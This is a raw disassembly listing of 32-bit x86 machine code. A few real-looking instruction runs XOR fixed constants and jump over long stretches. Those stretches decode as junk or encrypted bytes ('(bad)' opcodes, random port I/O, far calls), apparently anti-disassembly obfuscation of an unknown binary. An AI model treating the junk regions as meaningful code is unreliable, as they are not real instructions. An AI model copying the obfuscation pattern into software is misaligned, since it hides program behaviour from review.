  41d581:	push   DWORD PTR [ebp-0x1c]
  41d584:	push   DWORD PTR [ebp-0x18]
  41d587:	push   DWORD PTR [ebp-0x28]
  41d58a:	push   0x42829f
  41d58f:	call   DWORD PTR ds:0x42e2a4
  41d595:	adc    DWORD PTR ds:0x428359,0x7656
  41d59f:	sbb    DWORD PTR ds:0x428521,edx
  41d5a5:	xor    DWORD PTR ds:0x428369,0x32fd
  41d5af:	mov    edx,DWORD PTR ds:0x428459
  41d5b5:	add    edx,DWORD PTR ds:0x4284fd
  41d5bb:	mov    DWORD PTR ds:0x428459,edx
  41d5c1:	sub    esi,esi
  41d5c3:	movzx  edx,BYTE PTR ds:0x428359
  41d5ca:	add    DWORD PTR ds:0x428515,edx
  41d5d0:	mov    DWORD PTR [ebp-0x170],eax
  41d5d6:	mov    DWORD PTR [ebp-0x15c],0xcb79b576
  41d5e0:	mov    DWORD PTR [ebp-0x158],0x9c2b8ae8
  41d5ea:	mov    DWORD PTR [ebp-0x154],0xcb79b572
  41d5f4:	mov    DWORD PTR [ebp-0x150],0x9c2b8ae8
  41d5fe:	mov    esi,DWORD PTR [ebp-0x174]
  41d604:	mov    eax,DWORD PTR [ebp-0x154]
  41d60a:	mov    edx,DWORD PTR [ebp-0x150]
  41d610:	xor    eax,0xcb79b576
  41d615:	xor    edx,0x9c2b8ae8
  41d61b:	mov    cl,0x2
  41d61d:	call   0x408bb8
  41d622:	mov    edi,eax
  41d624:	mov    ebx,edx
  41d626:	mov    eax,DWORD PTR [ebp-0x154]
  41d62c:	jmp    0x41da13
  41d631:	out    dx,al
  41d632:	sbb    DWORD PTR [edi],eax
  41d634:	mov    dh,0x2c
  41d636:	mov    esp,0xfc579970
  41d63b:	bound  ebx,QWORD PTR [esi-0x6d89da80]
  41d641:	ja     0x41d694
  41d643:	sar    BYTE PTR [esi-0x41413bb6],0xf
  41d64a:	push   ebp
  41d64b:	test   eax,0x623731da
  41d650:	xchg   ecx,eax
  41d651:	jge    0x41d6ac
  41d653:	inc    edi
  41d654:	clc    
  41d655:	neg    DWORD PTR [esi+0x7d9f4e73]
  41d65b:	xor    eax,0xaf1a1ae2
  41d660:	lock in eax,0xe7
  41d663:	sub    eax,0x13a2b4cb
  41d668:	inc    ecx
  41d669:	pusha  
  41d66a:	xchg   DWORD PTR [esi+edx*1-0x6d],esi
  41d66e:	dec    eax
  41d66f:	loop   0x41d605
  41d671:	(bad)  
  41d673:	stos   DWORD PTR es:[edi],eax
  41d674:	sbb    BYTE PTR [ebx+0x6b6fcdd3],cl
  41d67a:	add    BYTE PTR ds:0xd413fb1b,ah
  41d680:	lods   eax,DWORD PTR ds:[esi]
  41d681:	xor    al,BYTE PTR [ecx]
  41d683:	mov    ah,0x7f
  41d685:	xor    eax,0x24510f82
  41d68a:	in     eax,0x77
  41d68c:	xor    esi,ebx
  41d68e:	xchg   esi,eax
  41d68f:	sub    BYTE PTR [edi],dh
  41d691:	adc    edx,edi
  41d693:	enter  0xe077,0x97
  41d697:	cld    
  41d698:	sub    BYTE PTR [esi],cl
  41d69a:	pop    ebx
  41d69b:	out    0xa1,eax
  41d69d:	js     0x41d70f
  41d69f:	push   ecx
  41d6a0:	loope  0x41d63e
  41d6a2:	cmp    ah,BYTE PTR [edx-0x367c446]
  41d6a8:	dec    esi
  41d6a9:	outs   dx,BYTE PTR ds:[esi]
  41d6aa:	cmp    edx,DWORD PTR [eax]
  41d6ac:	sub    eax,0xee22e6f1
  41d6b1:	sub    eax,0xc856dceb
  41d6b6:	je     0x41d6da
  41d6b8:	mov    eax,ds:0xe346c125
  41d6bd:	mov    DWORD PTR [esi],esp
  41d6bf:	je     0x41d6a1
  41d6c1:	jb     0x41d6b2
  41d6c3:	mov    ds:0x90f6391b,eax
  41d6c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6c9:	iret   
  41d6ca:	int3   
  41d6cb:	sbb    DWORD PTR [edx],eax
  41d6cd:	mov    edi,0x8666c728
  41d6d2:	jl     0x41d73e
  41d6d4:	nop
  41d6d5:	sbb    BYTE PTR [esi],bh
  41d6d7:	mov    esi,0x12e3b215
  41d6dc:	fwait
  41d6dd:	push   ebp
  41d6de:	fstp   DWORD PTR [ecx]
  41d6e0:	sbb    eax,0x2e1fb283
  41d6e5:	push   cs
  41d6e6:	fidivr DWORD PTR ds:0x761405a4
  41d6ec:	ins    DWORD PTR es:[edi],dx
  41d6ed:	pushf  
  41d6ee:	push   ebx
  41d6ef:	mov    eax,0xd33f636d
  41d6f4:	(bad)  [ebx-0x35]
  41d6f7:	shr    DWORD PTR [edx],cl
  41d6f9:	xchg   DWORD PTR [edx+0x209a90ef],edi
  41d6ff:	xchg   BYTE PTR [esp+eiz*8+0x3d],ch
  41d703:	adc    ch,BYTE PTR [eax]
  41d705:	aam    0x4f
  41d707:	push   edx
  41d708:	pop    es
  41d709:	mov    ds:0xf41952cc,al
  41d70e:	push   cs
  41d70f:	ins    DWORD PTR es:[edi],dx
  41d710:	mov    eax,ds:0x9c2cfaea
  41d715:	lahf   
  41d716:	xor    edi,edi
  41d718:	mov    ecx,0x889ebd68
  41d71d:	or     DWORD PTR [edx],eax
  41d71f:	shr    DWORD PTR [ebp+0x64],0x4c
  41d723:	jp     0x41d744
  41d725:	das    
  41d726:	nop
  41d727:	hlt    
  41d728:	ds in  al,dx
  41d72a:	mov    ds:0x177ee772,eax
  41d72f:	icebp  
  41d730:	mov    cl,cl
  41d732:	ret    
  41d733:	rcl    bh,0x82
  41d736:	dec    edi
  41d737:	mov    ah,0xa6
  41d739:	and    esp,DWORD PTR [edi+ecx*4-0x3310aeac]
  41d740:	add    BYTE PTR [ebp+0x1d],cl
  41d743:	and    BYTE PTR [ebx+0x1b87486a],dl
  41d749:	fwait
  41d74a:	add    eax,0x9448837f
  41d74f:	push   esi
  41d750:	mov    cs,WORD PTR [esi]
  41d752:	les    edx,FWORD PTR [ebx-0x3e]
  41d755:	or     DWORD PTR [edx-0x5e66460f],0xffffffa1
  41d75c:	out    0xa4,al
  41d75e:	jle    0x41d7ce
  41d760:	or     DWORD PTR [edx],ebx
  41d762:	test   BYTE PTR [esi-0x74],al
  41d765:	sub    al,BYTE PTR ds:[ebp+0x3c57f5ab]
  41d76c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d76d:	fcmove st,st(0)
  41d76f:	xchg   edx,eax
  41d770:	scas   al,BYTE PTR es:[edi]
  41d771:	dec    esp
  41d772:	mov    edi,0xca13347b
  41d777:	mov    BYTE PTR [ebp+0x1f],bl
  41d77a:	fdivr  DWORD PTR [ecx+0x3a1a971b]
  41d780:	retf   0x786c
  41d783:	sub    DWORD PTR [edi],ebx
  41d785:	dec    esi
  41d786:	out    dx,al
  41d787:	sar    BYTE PTR [edx+ebp*4],1
  41d78a:	jle    0x41d789
  41d78c:	jg     0x41d755
  41d78e:	xchg   ebp,eax
  41d78f:	mov    BYTE PTR ds:0xdb366db3,bh
  41d795:	popf   
  41d796:	mov    BYTE PTR [esi-0x14],cl
  41d799:	xor    al,0x6f
  41d79b:	fisubr WORD PTR [ecx+0x39]
  41d79e:	pop    ds
  41d79f:	ficomp DWORD PTR [edi]
  41d7a1:	and    BYTE PTR [ebx],ah
  41d7a3:	das    
  41d7a4:	mov    eax,0x61d41d51
  41d7a9:	pop    ds
  41d7aa:	pop    es
  41d7ab:	(bad)
  41d7ae:	sbb    al,0xfc
  41d7b0:	bound  eax,QWORD PTR [esi]
  41d7b2:	cmp    al,al
  41d7b4:	sbb    BYTE PTR [edx],al
  41d7b6:	fdivr  st,st(5)
  41d7b8:	jno    0x41d7e3
  41d7ba:	sbb    ebp,ebp
  41d7bc:	imul   al
  41d7be:	test   eax,0x5af2991f
  41d7c3:	test   DWORD PTR [esi-0x38],eax
  41d7c6:	or     al,0xfe
  41d7c8:	arpl   WORD PTR [ebp-0x77],bx
  41d7cb:	pop    eax
  41d7cc:	or     BYTE PTR [edx],dh
  41d7ce:	inc    esi
  41d7cf:	icebp  
  41d7d0:	mov    ebp,0x48ba6d67
  41d7d5:	pop    ebx
  41d7d6:	ja     0x41d7f4
  41d7d8:	jge    0x41d844
  41d7da:	rcr    DWORD PTR [ebp-0x45],cl
  41d7dd:	das    
  41d7de:	push   0x4b
  41d7e0:	sbb    esi,DWORD PTR [ecx-0xa]
  41d7e3:	fcomp  QWORD PTR [esi]
  41d7e5:	adc    al,0x2
  41d7e7:	nop
  41d7e8:	out    dx,al
  41d7e9:	arpl   WORD PTR [ebp-0x61],dx
  41d7ec:	push   es
  41d7ed:	clc    
  41d7ee:	mov    DWORD PTR [edx],ebp
  41d7f0:	loopne 0x41d86b
  41d7f2:	adc    bh,dh
  41d7f4:	aas    
  41d7f5:	xor    eax,0x9a80678c
  41d7fa:	mov    dh,ah
  41d7fc:	sub    eax,0xf84cc99d
  41d801:	pop    es
  41d802:	out    0x59,eax
  41d804:	sub    BYTE PTR [ecx+ebp*2],ch
  41d807:	sar    BYTE PTR [esi],0xd6
  41d80a:	jno    0x41d866
  41d80c:	sahf   
  41d80d:	mov    fs,ebx
  41d80f:	or     eax,0x916443a3
  41d814:	pop    es
  41d815:	push   esp
  41d816:	jl     0x41d857
  41d818:	mov    edi,0x9bc28545
  41d81d:	xor    eax,0xf5d15a93
  41d822:	xlat   BYTE PTR ds:[ebx]
  41d823:	pushf  
  41d824:	or     DWORD PTR [ebp+0x6ec73242],eax
  41d82a:	jne    0x41d812
  41d82c:	inc    edi
  41d82d:	xor    eax,0xd4ab57c4
  41d832:	(bad)  [ecx]
  41d834:	xchg   ebx,eax
  41d835:	dec    eax
  41d836:	mov    ebx,0x9f0eb070
  41d83b:	in     eax,0xf3
  41d83d:	shr    BYTE PTR [ebx+0x49],cl
  41d840:	fadd   st(6),st
  41d842:	mov    al,ds:0xf8c04d09
  41d847:	push   ebp
  41d848:	xchg   DWORD PTR [ecx-0x22c46bec],ebp
  41d84e:	(bad)  
  41d84f:	sub    eax,0x9b967b54
  41d854:	test   eax,0x6101e13e
  41d859:	popa   
  41d85a:	shl    BYTE PTR [ebx-0x40af687c],1
  41d860:	sub    al,0x2e
  41d862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d863:	inc    esi
  41d864:	pop    ds
  41d865:	and    al,0xd7
  41d867:	call   0x303f:0x113031ca
  41d86e:	mov    bh,0xe5
  41d870:	and    ebp,eax
  41d872:	ret    
  41d873:	(bad)  
  41d874:	adc    BYTE PTR [eax-0x5f],cl
  41d877:	adc    DWORD PTR [ecx],ecx
  41d879:	out    0x72,al
  41d87b:	pushf  
  41d87c:	xchg   ebp,eax
  41d87d:	inc    BYTE PTR es:[ebp+0x58f5c071]
  41d884:	sbb    al,0xd2
  41d886:	test   eax,0xb88da9c0
  41d88b:	retf   0x27db
  41d88e:	cmp    bh,0x43
  41d891:	jbe    0x41d8a5
  41d893:	mov    eax,ds:0xb88378de
  41d898:	sbb    DWORD PTR [edi+0x13],edx
  41d89b:	lock mov al,0xdf
  41d89e:	aam    0xe6
  41d8a0:	cmp    ch,BYTE PTR [ecx-0x4ff7f31b]
  41d8a6:	mov    ecx,edx
  41d8a8:	(bad)  
  41d8aa:	test   eax,0xa1ee1a2a
  41d8af:	cmp    DWORD PTR [edi],edi
  41d8b1:	in     eax,0xff
  41d8b3:	inc    ebp
  41d8b4:	cli    
  41d8b5:	pop    ebp
  41d8b6:	mov    cl,0xae
  41d8b8:	mov    edx,0x6d5c17d9
  41d8bd:	jmp    0x8a74ffb9
  41d8c2:	pop    eax
  41d8c3:	scas   al,BYTE PTR es:[edi]
  41d8c4:	jge    0x41d8a9
  41d8c6:	les    esp,FWORD PTR [ecx]
  41d8c8:	xchg   esi,eax
  41d8c9:	les    ecx,FWORD PTR [ebp+0x41]
  41d8cc:	sbb    al,0xff
  41d8ce:	js     0x41d901
  41d8d0:	pop    edx
  41d8d1:	imul   ecx,DWORD PTR ds:0x2a7dae8b,0x5a
  41d8d8:	aad    0x36
  41d8da:	add    BYTE PTR [ebp+ecx*4-0x5],ah
  41d8de:	cmc    
  41d8df:	xchg   DWORD PTR [ecx-0x4f],ebx
  41d8e2:	and    bl,dh
  41d8e4:	sub    BYTE PTR [eax+0x65d582a1],ah
  41d8ea:	je     0x41d8a4
  41d8ec:	xor    al,0xc8
  41d8ee:	fcomp  DWORD PTR [ebp-0x4f7fda6b]
  41d8f4:	xor    eax,0x1da7dc16
  41d8f9:	lds    esi,FWORD PTR [edx-0x59e0dc01]
  41d8ff:	sahf   
  41d900:	or     ch,BYTE PTR ds:0xc04dbcc6
  41d906:	loop   0x41d933
  41d908:	cld    
  41d909:	mov    ch,0xcb
  41d90b:	inc    esp
  41d90c:	sahf   
  41d90d:	push   cs
  41d90e:	stos   BYTE PTR es:[edi],al
  41d90f:	pop    ecx
  41d910:	jae    0x41d97c
  41d912:	cld    
  41d913:	sub    DWORD PTR [edx],esp
  41d915:	rcl    DWORD PTR [esi+0x3e],1
  41d918:	pop    ss
  41d919:	daa    
  41d91a:	js     0x41d8e6
  41d91c:	mov    bl,cl
  41d91e:	mov    es,WORD PTR [eax]
  41d920:	pop    ebx
  41d921:	fsubr  DWORD PTR es:[eax+0x2a]
  41d925:	pop    esi
  41d926:	mov    WORD PTR [ecx-0x2b],gs
  41d929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d92a:	das    
  41d92b:	jmp    0x310c944f
  41d930:	popa   
  41d931:	cwde   
  41d932:	pop    edx
  41d933:	pop    es
  41d934:	mov    es,WORD PTR gs:[esi]
  41d937:	push   es
  41d938:	inc    ebx
  41d939:	mov    bl,0x19
  41d93b:	cmp    al,0xb6
  41d93d:	sub    ah,dl
  41d93f:	xchg   DWORD PTR [ebx+0x4ed72e6b],edi
  41d945:	cmp    DWORD PTR [ebp+0x7a],edx
  41d948:	xor    eax,0xe88b037a
  41d94d:	sti    
  41d94e:	sti    
  41d94f:	in     al,0xe5
  41d951:	dec    edx
  41d952:	mov    ch,0xee
  41d954:	jmp    0x8694:0xdb784690
  41d95b:	stos   DWORD PTR es:[edi],eax
  41d95c:	fwait
  41d95d:	out    0xea,eax
  41d95f:	mov    edi,0x584e84c1
  41d964:	xchg   DWORD PTR [esi],esi
  41d966:	(bad)  
  41d967:	mov    al,ds:0xbbe3052b
  41d96c:	ss pusha 
  41d96e:	and    ebp,esp
  41d970:	push   esp
  41d971:	imul   edx,DWORD PTR [ebp-0x814c24b]
  41d978:	cli    
  41d979:	aas    
  41d97a:	push   esp
  41d97b:	and    ecx,0x5b
  41d97e:	sub    al,0xd7
  41d980:	xlat   BYTE PTR ds:[ebx]
  41d981:	dec    ebx
  41d982:	mov    esp,0x67637ccc
  41d987:	xor    ebx,ecx
  41d989:	push   ebx
  41d98a:	fsubr  DWORD PTR [ebp-0x1344e358]
  41d990:	fdiv   DWORD PTR [esi+0x1a]
  41d993:	imul   BYTE PTR [edx+0x5f]
  41d996:	popa   
  41d997:	std    
  41d998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d999:	ss call 0x8a9d9a2a
  41d99f:	in     eax,dx
  41d9a0:	out    0xc7,al
  41d9a2:	jb     0x41da10
  41d9a4:	ror    DWORD PTR [eax],cl
  41d9a6:	adc    edi,0x64
  41d9a9:	ss pop edx
  41d9ab:	icebp  
  41d9ac:	mov    eax,0xed1ec956
  41d9b1:	cmp    cl,BYTE PTR [ebp+0x21]
  41d9b4:	fwait
  41d9b5:	je     0x41da0b
  41d9b7:	call   0x4957:0xb7daabe4
  41d9be:	adc    al,0xf
  41d9c0:	mov    bl,0xfc
  41d9c2:	jp     0x41da23
  41d9c4:	aam    0xc7
  41d9c6:	inc    esi
  41d9c7:	xchg   edx,eax
  41d9c8:	mov    ah,BYTE PTR [ebx+0x2b]
  41d9cb:	jle    0x41d9c5
  41d9cd:	call   0x7e9ce5f0
  41d9d2:	lods   eax,DWORD PTR ds:[esi]
  41d9d3:	in     al,0x54
  41d9d5:	dec    ebp
  41d9d6:	jg     0x41d975
  41d9d8:	mov    esp,0x7ed2ec99
  41d9dd:	adc    BYTE PTR [ecx+0x1c30cacc],al
  41d9e3:	mov    ebp,0x5090cc48
  41d9e8:	mov    DWORD PTR ds:0xe2749311,ebx
  41d9ee:	and    esp,DWORD PTR [eax]
  41d9f0:	mov    esp,0xc80d5c8f
  41d9f5:	mov    al,ds:0x3fcc6620
  41d9fa:	mov    edx,DWORD PTR [edx]
  41d9fc:	cmp    al,0x81
  41d9fe:	cwde   
  41d9ff:	fnstcw WORD PTR [edx-0xf23db86]
  41da05:	push   ds
  41da06:	inc    edi
  41da07:	push   ds
  41da08:	lods   al,BYTE PTR ds:[esi]
  41da09:	cmp    al,0x8b
  41da0b:	sub    al,bh
  41da0d:	add    eax,0xf637cd93
  41da12:	das    
  41da13:	mov    edx,DWORD PTR [ebp-0x150]
  41da19:	xor    eax,0xcb79b576
  41da1e:	xor    edx,0x9c2b8ae8
  41da24:	mov    cl,0x3e
  41da26:	call   0x42241b
  41da2b:	or     edi,eax
  41da2d:	or     ebx,edx
  41da2f:	mov    eax,DWORD PTR [ebp-0x15c]
  41da35:	mov    edx,DWORD PTR [ebp-0x158]
  41da3b:	jmp    0x41de22
  41da40:	outs   dx,BYTE PTR ds:[esi]
  41da41:	cdq    
  41da42:	bound  ebp,QWORD PTR fs:[esp+edi*4+0x63179970]
  41da4a:	xor    bl,ch
  41da4c:	inc    ebx
  41da4d:	mov    ecx,0x5903924c
  41da52:	sar    BYTE PTR [esi-0x41413bb6],0x0
  41da59:	mov    ebx,esi
  41da5b:	fiadd  DWORD PTR [ebp+0x5f]
  41da5e:	ret    
  41da5f:	fadd   QWORD PTR [ebx]
  41da61:	icebp  
  41da62:	in     al,0xe7
  41da64:	mov    BYTE PTR [edx+eiz*8+0x29],ch
  41da68:	and    BYTE PTR [edi],ch
  41da6a:	xchg   ebx,eax
  41da6b:	retf   0xab49
  41da6e:	int3   
  41da6f:	cld    
  41da70:	push   0x42
  41da72:	adc    bh,BYTE PTR [esi]
  41da74:	jl     0x41da5b
  41da76:	sub    dl,dl
  41da78:	or     eax,0x772f49d7
  41da7d:	(bad)  
  41da7e:	adc    edx,DWORD PTR [edi-0x5202d97e]
  41da84:	les    esp,FWORD PTR [esi-0x4ca7e2ba]
  41da8a:	in     al,0x6c
  41da8c:	gs jmp 0x41daf9
  41da8f:	pop    ss
  41da90:	push   esp
  41da91:	and    BYTE PTR [ebp-0x15],bh
  41da94:	bound  edi,QWORD PTR [esi+0x5e07ce2d]
  41da9a:	sbb    BYTE PTR [esi-0x4b8d5e56],ch
  41daa0:	add    BYTE PTR [eax],bh
  41daa2:	mov    bl,0xea
  41daa4:	or     eax,0x7ac2fb88
  41daa9:	es clc 
  41daab:	add    ah,0x6d
  41daae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daaf:	enter  0xd0ac,0xee
  41dab3:	add    BYTE PTR [ebx+0xc],0xae
  41dab7:	and    BYTE PTR [ebx],bl
  41dab9:	mov    edi,0x16d4aaf7
  41dabe:	test   al,0xea
  41dac0:	inc    eax
  41dac1:	in     eax,dx
  41dac2:	addr16 push 0x402b480
  41dac8:	sub    esi,DWORD PTR ds:0xbcac6a3a
  41dace:	inc    esi
  41dacf:	aaa    
  41dad0:	mov    esp,DWORD PTR [eax-0x20]
  41dad3:	push   eax
  41dad4:	stos   BYTE PTR es:[edi],al
  41dad5:	mov    ecx,0xdae12f75
  41dada:	ss (bad) 
  41dadc:	shl    BYTE PTR [eax+0x54],cl
  41dadf:	xchg   ebp,eax
  41dae0:	out    dx,eax
  41dae1:	lahf   
  41dae2:	xchg   ecx,eax
  41dae3:	or     DWORD PTR [edi-0x3b],0xa2612ca5
  41daea:	adc    al,bh
  41daec:	mov    ah,0xb6
  41daee:	mov    DWORD PTR ds:0x1d38021d,0x223c7940
  41daf8:	lock scas eax,DWORD PTR es:[edi]
  41dafa:	fcmovnu st,st(7)
  41dafc:	retf   
  41dafd:	cwde   
  41dafe:	inc    ebp
  41daff:	or     BYTE PTR [ecx-0x27],0x53
  41db03:	xchg   DWORD PTR [esi],edx
  41db05:	jne    0x41db13
  41db07:	in     eax,0xc9
  41db09:	xor    al,0x26
  41db0b:	mov    dl,BYTE PTR [ebx-0x18e904e5]
  41db11:	loope  0x41db83
  41db13:	pop    ebx
  41db14:	data16 jno 0x41dac4
  41db17:	out    0xd1,al
  41db19:	jge    0x41dae8
  41db1b:	stos   BYTE PTR es:[edi],al
  41db1c:	das    
  41db1d:	(bad)  
  41db1f:	mov    edx,esp
  41db21:	mov    al,0x30
  41db23:	jae    0x41dae9
  41db25:	(bad)  
  41db26:	push   eax
  41db27:	xor    ebp,eax
  41db29:	repnz out dx,al
  41db2b:	cwde   
  41db2c:	hlt    
  41db2d:	xchg   esp,eax
  41db2e:	add    al,0xfe
  41db30:	sub    DWORD PTR [eax],ebx
  41db32:	push   ss
  41db33:	data16 stos BYTE PTR es:[edi],al
  41db35:	xor    edi,DWORD PTR [esi-0x11]
  41db38:	cwde   
  41db39:	fs jns 0x41db48
  41db3c:	les    esi,FWORD PTR [ebp*8-0x2802e011]
  41db43:	xchg   ecx,eax
  41db44:	inc    esi
  41db45:	cli    
  41db46:	jecxz  0x41db0b
  41db48:	jb     0x41dba4
  41db4a:	jbe    0x41dafe
  41db4c:	xor    ecx,ecx
  41db4e:	mov    dl,BYTE PTR ds:0x7a506e29
  41db54:	xor    cl,BYTE PTR [edx+0x61605276]
  41db5a:	out    0x25,al
  41db5c:	out    0x5d,al
  41db5e:	adc    dl,bh
  41db60:	fidiv  WORD PTR [ecx-0x6064f16]
  41db66:	sbb    DWORD PTR [ebx+0x5e12cc8d],edi
  41db6c:	mov    ds:0x50f0aa3e,eax
  41db71:	and    edx,edi
  41db73:	adc    ebx,edx
  41db75:	and    ecx,edx
  41db77:	adc    al,0xb9
  41db79:	cld    
  41db7a:	pop    edi
  41db7b:	in     eax,0x9
  41db7d:	sar    BYTE PTR [ecx+0x31],1
  41db80:	rcr    DWORD PTR [eax-0xd],cl
  41db83:	mov    bl,0xc8
  41db85:	inc    ebx
  41db86:	push   esp
  41db87:	xchg   esp,eax
  41db88:	out    0x4,al
  41db8a:	push   0xfffffff4
  41db8c:	push   ecx
  41db8d:	iret   
  41db8e:	cld    
  41db8f:	add    BYTE PTR [esp+ebx*1+0xf01ca7e],bl
  41db96:	push   ecx
  41db97:	jbe    0x41dbb1
  41db99:	mov    al,ds:0x1509bbef
  41db9e:	dec    esp
  41db9f:	pop    ecx
  41dba0:	fsubp  st(2),st
  41dba2:	and    esp,ecx
  41dba4:	jge    0x41dc09
  41dba6:	idiv   BYTE PTR [edx+0x2e7dbf6]
  41dbac:	fisttp DWORD PTR [ecx]
  41dbae:	lods   eax,DWORD PTR ds:[esi]
  41dbaf:	jbe    0x41dbb0
  41dbb1:	xchg   ecx,eax
  41dbb2:	in     eax,dx
  41dbb3:	pop    ecx
  41dbb4:	lahf   
  41dbb5:	push   edi
  41dbb6:	push   edx
  41dbb7:	mov    ss,WORD PTR [edi+0x3f8770d0]
  41dbbd:	cld    
  41dbbe:	add    al,BYTE PTR [edi+esi*4]
  41dbc1:	lahf   
  41dbc2:	adc    al,0x6c
  41dbc4:	addr16 cmp esp,ebx
  41dbc7:	cmp    eax,0xc5680f12
  41dbcc:	pop    ebx
  41dbcd:	push   ebx
  41dbce:	jl     0x41db78
  41dbd0:	jge    0x41db79
  41dbd2:	push   cs
  41dbd3:	clc    
  41dbd4:	inc    edx
  41dbd5:	xchg   esi,eax
  41dbd6:	mov    dl,0xf9
  41dbd8:	push   0x7f
  41dbda:	xchg   ebx,eax
  41dbdb:	aad    0x2c
  41dbdd:	adc    BYTE PTR [eax-0x8],0xe9
  41dbe1:	jb     0x41dbba
  41dbe3:	mov    ds:0x8776a4e3,eax
  41dbe8:	jns    0x41dbab
  41dbea:	xchg   ebx,eax
  41dbeb:	and    dh,ch
  41dbed:	ds hlt 
  41dbef:	push   ds
  41dbf0:	test   DWORD PTR [edi-0x75],edx
  41dbf3:	in     al,dx
  41dbf4:	ja     0x41dc3e
  41dbf6:	mov    ebx,0xa12dd17a
  41dbfb:	test   eax,0x7ab8c1a5
  41dc00:	retf   0x5816
  41dc03:	loopne 0x41dbf6
  41dc05:	aaa    
  41dc06:	jecxz  0x41dbc2
  41dc08:	mov    DWORD PTR [ebx+eiz*4+0x4a],eax
  41dc0c:	sahf   
  41dc0d:	inc    ecx
  41dc0e:	sbb    al,0xea
  41dc10:	outs   dx,DWORD PTR ds:[esi]
  41dc11:	aas    
  41dc12:	add    cl,BYTE PTR [ebp-0x4b]
  41dc15:	inc    esp
  41dc16:	stc    
  41dc17:	lahf   
  41dc18:	cwde   
  41dc19:	es stos DWORD PTR es:[edi],eax
  41dc1b:	mov    dl,0x9e
  41dc1d:	test   eax,0x35fdfd84
  41dc22:	pop    edi
  41dc23:	push   ss
  41dc24:	pop    esp
  41dc25:	mov    eax,ds:0x85462823
  41dc2a:	rol    DWORD PTR [ecx+0x71],1
  41dc2d:	mov    cl,0x92
  41dc2f:	cmp    al,0xf3
  41dc31:	cmp    al,0xc9
  41dc33:	jne    0x41dc0c
  41dc35:	or     esi,ebx
  41dc37:	aaa    
  41dc38:	adc    BYTE PTR [esi+0x2d],al
  41dc3b:	sti    
  41dc3c:	xor    DWORD PTR [esi+ecx*4],eax
  41dc3f:	mov    ch,0x78
  41dc41:	into   
  41dc42:	xchg   DWORD PTR [ebx-0x13],edx
  41dc45:	push   ss
  41dc46:	(bad)  
  41dc47:	and    BYTE PTR [eax+0x7a8b1832],ch
  41dc4d:	ret    
  41dc4e:	adc    eax,0xa2d9356b
  41dc53:	dec    esi
  41dc54:	push   es
  41dc55:	add    al,0x20
  41dc57:	mov    al,BYTE PTR [edi+0x34]
  41dc5a:	icebp  
  41dc5b:	out    0xe,al
  41dc5d:	arpl   WORD PTR [ebx],dx
  41dc5f:	xor    ebp,DWORD PTR [ebp-0x6c466b91]
  41dc65:	lahf   
  41dc66:	mov    ds:0x2dd4c19,eax
  41dc6b:	mov    al,ds:0xf487b414
  41dc70:	jne    0x41dcaa
  41dc72:	retf   0xfdbe
  41dc75:	aas    
  41dc76:	mov    ch,0x26
  41dc78:	pop    DWORD PTR [edx]
  41dc7a:	pop    DWORD PTR [ebp-0x50b0a043]
  41dc80:	repnz mov esi,0xe4a784e5
  41dc86:	or     DWORD PTR [eax-0x74],0xffffff9e
  41dc8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc8b:	jmp    0xca4f:0xe89085cc
  41dc92:	and    bh,BYTE PTR [ebx+0x9]
  41dc95:	add    BYTE PTR [ebx+ecx*2+0x71],al
  41dc99:	es sbb al,0x6b
  41dc9c:	in     eax,dx
  41dc9d:	cwde   
  41dc9e:	pushf  
  41dc9f:	aad    0xd6
  41dca1:	test   al,0x3d
  41dca3:	ja     0x41dccb
  41dca5:	push   esi
  41dca6:	jae    0x41dc74
  41dca8:	add    dl,ch
  41dcaa:	std    
  41dcab:	scas   eax,DWORD PTR es:[edi]
  41dcac:	aad    0x50
  41dcae:	xlat   BYTE PTR ds:[ebx]
  41dcaf:	sub    esp,ebp
  41dcb1:	push   0x94ba0cc7
  41dcb6:	push   ebx
  41dcb7:	pop    edi
  41dcb8:	cwde   
  41dcb9:	(bad)  
  41dcba:	mov    bh,0x88
  41dcbc:	xor    cl,al
  41dcbe:	and    al,BYTE PTR [ecx]
  41dcc0:	or     DWORD PTR [ebp+0x3e7eda82],ecx
  41dcc6:	pop    ebp
  41dcc7:	mov    dl,BYTE PTR [eax-0x6a9c9c7]
  41dccd:	int    0x95
  41dccf:	lea    ebx,[edi+0x3809df0e]
  41dcd5:	sbb    DWORD PTR [edx-0x542b5e42],ecx
  41dcdb:	dec    ecx
  41dcdc:	push   ss
  41dcdd:	and    edi,esi
  41dcdf:	leave  
  41dce0:	loopne 0x41dcf8
  41dce2:	pop    esp
  41dce3:	fild   WORD PTR ds:0x96ebd806
  41dce9:	mov    ds:0x8f496c67,eax
  41dcee:	xor    ah,ch
  41dcf0:	test   BYTE PTR [ecx-0x7d],cl
  41dcf3:	or     ch,BYTE PTR [edx]
  41dcf5:	into   
  41dcf6:	dec    ebx
  41dcf7:	cmp    edx,esp
  41dcf9:	sub    DWORD PTR [edi],ecx
  41dcfb:	mov    cs,eax
  41dcfd:	pop    ebx
  41dcfe:	cmp    bh,BYTE PTR [ecx-0x387d57e5]
  41dd04:	stos   BYTE PTR es:[edi],al
  41dd05:	push   ds
  41dd06:	dec    ebp
  41dd07:	dec    ebx
  41dd08:	aas    
  41dd09:	neg    DWORD PTR [edi-0x52]
  41dd0c:	or     ecx,DWORD PTR [ebx]
  41dd0e:	push   0x4b
  41dd10:	xchg   ecx,eax
  41dd11:	fild   DWORD PTR [edi-0x2262f997]
  41dd17:	and    edi,DWORD PTR [edi-0x55662799]
  41dd1d:	mov    WORD PTR ds:0x347fad85,fs
  41dd23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd24:	(bad)  
  41dd25:	pop    edi
  41dd26:	dec    BYTE PTR [ebx+esi*2+0x77]
  41dd2a:	adc    BYTE PTR [eax],dh
  41dd2c:	and    eax,0xdf351df2
  41dd31:	pop    ss
  41dd32:	shl    ecx,cl
  41dd34:	adc    eax,0x676b0e42
  41dd39:	cs enter 0xc22d,0x8e
  41dd3e:	sbb    edi,DWORD PTR [esi+0x46]
  41dd41:	dec    ecx
  41dd42:	ins    DWORD PTR es:[edi],dx
  41dd43:	scas   al,BYTE PTR es:[edi]
  41dd44:	test   eax,0x55b89608
  41dd49:	stos   DWORD PTR es:[edi],eax
